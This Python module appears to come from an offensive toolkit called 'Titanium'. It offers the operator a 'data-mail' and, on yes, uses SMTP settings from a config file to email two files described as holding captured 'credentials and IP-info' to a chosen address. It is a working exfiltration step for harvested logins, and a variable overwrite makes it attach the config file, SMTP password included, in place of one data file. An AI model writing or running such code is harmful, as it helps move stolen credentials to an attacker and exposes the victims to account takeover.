from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from Core.Support import Font
from configparser import ConfigParser
from email.mime.multipart import MIMEMultipart
import smtplib

class Sender:
    
    @staticmethod
    def mail(header_mail,nomefile,nomefile2,dest2):
        mail = int(input(
            Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "WOULD YOU LIKE TO RECIEVE A DATA-MAIL?(1)YES(2)NO" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
        if mail == 1:
            print(
                Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "SENDING EMAIL PLEASE WAIT" + Font.Color.GREEN + "[+]")
            nomefile = "Configuration/Configuration.ini"
            Parser = ConfigParser()
            Parser.read(nomefile)            
            email = Parser["Smtp"]["Email"]
            password = Parser["Smtp"]["Password"]
            destination = Parser["Smtp"]["Destination"]
            host = Parser["Smtp"]["Server"]
            host2 = (str(host))
            port = Parser["Smtp"]["Port"]
            port2 = (int(port))
            message = MIMEMultipart()
            message['From'] = "Titanium:"
            message["To"] = destination
            message["Subject"] = header_mail
            msg = "CREDENTIALS AND IP-INFO\nARE STORED ON THIS TWO FILES:"
            message.attach(MIMEText(msg, "plain"))
            filename = nomefile
            attachment = open(filename, "rb")
            file = MIMEBase("application", "octet-stream")
            file.set_payload(attachment.read())
            encoders.encode_base64(file)
            file.add_header("Content-Disposition", "attachment;filename=" + filename)
            message.attach(file)
            filename2 = nomefile2
            attachment = open(filename2, "rb")
            file2 = MIMEBase("application", "octet-stream")
            file2.set_payload(attachment.read())
            encoders.encode_base64(file2)
            file2.add_header("Content-Disposition", "attachment;filename=" + filename2)
            message.attach(file2)
            server = smtplib.SMTP(host2, port2)
            server.ehlo()
            server.starttls()
            server.login(email, password)
            text = message.as_string()
            server.sendmail(email, destination, text)
            inp = input(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "EMAIL SENT PRESS ENTER TO CONTINUE...")
            server.close()
        elif mail == 2:
            inp = input("\nCREDENTIALS ARE STORED IN" + dest2 + "\nPRESS ENTER TO CONTINUE...")